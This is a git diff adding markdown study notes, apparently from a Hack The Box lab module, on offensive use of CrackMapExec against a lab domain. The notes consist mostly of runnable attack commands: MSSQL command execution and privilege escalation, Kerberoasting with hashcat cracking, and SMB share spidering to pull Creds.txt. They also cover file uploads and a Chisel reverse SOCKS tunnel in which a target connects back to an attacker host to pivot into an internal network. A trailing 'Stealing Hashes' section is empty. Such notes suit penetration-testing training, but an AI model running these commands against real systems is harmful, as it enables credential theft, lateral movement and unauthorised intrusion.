@@ -54,6 +54,196 @@ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupme
 ````
 
 # MSSQL Enumeration and Attacks
+ - **Execute SQL Queries**
+```
+crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
+```
+We can also use the option `--local-auth` to specify an MSSQL user. If we don't select this option, a domain account will be used instead.
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 
+```
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
+```
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
+```
+- **Executing Windows Commands**
+When we find an account, CrackMapExec will automatically check if the user is a DBA (Database Administrator) account or not. If we notice the output **`Pwn3d!`**, the user is a Database Administrator. Users with DBA privileges can access, modify, or delete a database object and grant rights to other users. This user can perform any action against the database.
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami
+```
+- **Transfering Files via MSSQL**
+MSSQL allows us to download and upload files using OPENROWSET (Transact-SQL) and Ole Automation Procedures Server Configuration Options respectively. CrackMapExec incorporates those options with `--put-file` and `--get-file`.
+```
+
+```
+- **Upload File**
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
+```
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
+```
+- **Download a File from the Target Machine via MSSQL**
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
+```
+
+## SQL Privilege Escalation Module
+CrackMapExec includes a couple of modules for MSSQL, one of them is `mssql_priv`, which enumerates and exploits MSSQL privileges to attempt to escalate from a standard user to a sysadmin. To achieve this, this module enumerates two (2) different privilege escalation vectors in `MSSQL EXECUTE AS LOGIN` and `db_owner role`. The module has three options `enum_privs` to list privileges (default), `privesc` to escalate privileges, and `rollback` to return the user to its original state. Let's see it in action. In the following example, the user INLANEFREIGHT\robert has the privilege to impersonate julio who is a sysadmin user.
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+```
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+```
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
+```
+
+> Note: To test the module with the users we have, it is necessary to try them one by one since the multi-user functionality with `--no-bruteforce` and `--continue-on-success` does not support testing a module with multiple accounts at the same time.
+
+# Finding Kerberoastable Accounts
+The Kerberoasting attack aims to harvest TGS (Ticket Granting Service) Tickets from a user with servicePrincipalName (SPN) values, typically a service account. Any valid Active Directory account can request a TGS for any SPN account. Part of the ticket is encrypted with the account's NTLM password hash, which allows us to attempt to crack the password offline.
+
+To find the Kerberoastable accounts, we need to have a valid user in the domain, use the protocol LDAP with the option `--kerberoasting` followed by a file name, and specify the IP address of the DC as a target on CrackMapExec:
+
+- **Kerberoasting**
+```
+nxc ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
+```
+```
+hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
+```
+- **Testing the Account Credentials**
+```
+crackmapexec smb 10.129.203.121 -u peter -p Password123
+```
+
+# Spidering and Finding Juicy Information in an SMB Share
+
+- **Identifying if Accounts Have Access to Shared Folders**
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares
+```
+- **Using the Spider Option to Search for Files Containing "txt"**
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --pattern txt
+```
+We can also use regular expressions with the option `--regex [REGEX]` to do more granular searches on folders, file names, or file content. In the following example, let's use `--regex .` to display any file and directory in the shared folder IT:
+```
+crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --regex .
+```
+If we want to search file content, we need to enable it with the option `--content`. Let's search for a file containing the word "Encrypt."
+- **Searching File Contents**
+```
+crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt
+```
+- **Retrieving a File in a Shared Folder**
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt Creds.txt
+```
+- **Sending a File to a Shared Folder**
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd
+```
+> Note: If we are transferring a large file and it fails, make sure to try again. If you keep getting an error, try adding the option `--smb-timeout` with a value greater than the default two (`2`).
+
+### The spider_plus Module
+
+We can use the module option EXCLUDE_DIR to prevent the tool from looking at shares like `IPC$`,`NETLOGON`,`SYSVOL`, etc.
+
+- **Using the Module spider_plus**
+
+```
+crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
+```
+- **Listing Files Available to the User**
+```
+cat /tmp/cme_spider_plus/10.129.203.121.json
+```
+If we want to download all the content of the share, we can use the option `READ_ONLY=false` as follow:
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
+```
+
+# Proxychains with CME
+
+![image](https://github.com/user-attachments/assets/f88f2da9-5224-47b4-bf8b-26c59c9629ab)
+
+1. Download and Run Chisel on our Attack Host:
+2. Download and Upload Chisel for Windows to the Target Host:
+3. Execute chisel.exe to connect to our Chisel server using the CrackMapExec command execution option `-x` (We will discuss this option more in the Command Execution section)
+4. Verify connection (port 1080)
+5. We need to configure proxychains to use the Chisel default port TCP 1080. We need to make sure to include socks5 127.0.0.1 1080 in the ProxyList section of the configuration file as follows:
+
+
+## Set Up the Tunnel
+- **Chisel - Reverse Tunnel**
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
+gunzip -d chisel.gz
+chmod +x chisel
+./chisel server --reverse
+```
+- **Upload Chisel**
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
+gunzip -d chisel.exe.gz
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
+```
+- **Connect to the Chisel Server**
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
+```
+- **Configure `proxychains`**
+```
+m3t3kh4n@htb[/htb]$ cat /etc/proxychains.conf
+
+<SNIP>
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+```
+- **Testing CrackMapExec via Proxychains**
+```
+proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
+```
+- **Proxychains4 with Quiet Option**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
+```
+- **Killing Chisel on the Target Machine**
+Once we have finished, we need to kill the Chisel process. To do this, we will use the option `-X` to execute PowerShell commands and run the PowerShell command `Stop-Process -Name chisel -Force`. We will discuss command execution in more detail in the Command Execution section.
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "Stop-Process -Name chisel -Force"
+```
+
+## Windows as the Server and Linux as the Client
+- **Starting Chisel as the Server in the Target Machine**
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe server --socks5"
+```
+- **Connecting to the Chisel Server from our Attack Host**
+```
+sudo chisel client 10.129.204.133:8080 socks
+```
+- **Using Proxychains to Connect to the Internal Network**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
+```
+
+# Stealing Hashes
+
+
+
+
+
+
 
 
 
